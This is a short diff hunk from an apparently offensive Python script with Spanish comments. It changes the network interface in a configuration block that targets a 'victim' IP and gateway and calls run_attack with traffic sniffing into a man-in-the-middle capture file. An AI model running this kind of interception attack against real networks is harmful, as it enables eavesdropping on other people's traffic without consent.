@@ -157,7 +157,7 @@ if __name__ == '__main__':
     # CONFIGURACIÓN PREDETERMINADA PARA TU RED
     VICTIM_IP = "192.168.67.60"
     GATEWAY_IP = "192.168.67.1"
-    IFACE = "eth0"
+    IFACE = "ens3"
     
     run_attack(iface=IFACE, victim_ip=VICTIM_IP, gateway_ip=GATEWAY_IP,
                interval=2.0, sniff_traffic=True, output="captura_mitm.pcap")
